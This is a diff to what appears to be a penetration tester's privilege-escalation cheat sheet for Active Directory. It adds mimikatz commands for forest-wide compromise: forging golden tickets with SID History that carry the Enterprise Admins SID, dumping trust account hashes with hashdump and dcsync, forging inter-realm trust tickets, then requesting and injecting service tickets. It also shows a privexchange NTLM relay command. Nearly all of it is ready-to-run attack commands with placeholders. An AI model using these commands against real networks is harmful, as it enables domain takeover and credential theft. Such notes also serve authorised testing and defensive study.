@@ -172,8 +172,23 @@ PrivEsc
     python privexchange.py -ah <ntlmrelay-url-path> <fqdn.exch-server> -u <domain_user_name> -d <fqdn.domain-name>
     
   Multi-Domain (Forrest) compromise usiing Sid History
-    https://adsecurity.org/?p=1640
-    kerberos::golden (/admin:Administrator|/user:DC_compname$) /domain:domain.fqdn /sid:child_domain_sid /sids:EA_Sid..-519 /krbtgt:krbtgt_hash /startoffset:0 /endin:600 /renewmax:10080 /ptt
+    SID History
+      https://adsecurity.org/?p=1640
+      mimikatz kerberos::golden </admin:Administrator|/user:DC_compname$> /domain:domain.fqdn /sid:current_domain_sid /sids:parent_domain_Sid..-519 /krbtgt:krbtgt_hash /startoffset:0 /endin:600 /renewmax:10080 /ptt
+    Trust Tickets
+      https://adsecurity.org/?p=1588
+      GET Trusts Hash
+      hashdump and look for account ending in $ which is not a computer account. This is the trust password. (Changes every 30 days)
+      dcsync current_domain_fqdn current_dom\target_domain$ (example: dcsync admin.offshore.com admin\client$)
+      External Trusts
+        mimikatz kerberos::golden /domain:domain.fqdn /sid:current_domain_sid /rc4:NTLM_Trust_Hash /user:Administrator /service:krbtgt /target:target_domain_fqdn /ticket:file.kirbi
+          - Save file.kirbi -> used for next command to get TGS in target domain
+        mimikatz asktgs C:\path\file.kirbi cifs/dc01.target.domain
+      Internal Trusts
+        mimikatz lsadump::trusts /patch
+        mimikatz kerberos::golden /domain:domain.fqdn /sid:current_domain_sid /sids:target_domain_sid-519 /rc4:NTLM_Trust_Hash /user:Administrator /service:krbtgt  /target:target_domain_fqdn /ticket:file.kirbi
+        mimikatz asktgs C:\path\file.kirbi cifs/dc01.target.domain
+        mimikatz kirbikator lsa file.kirbi
     
   Bypass UAC
     https://github.com/hfiref0x/UACME
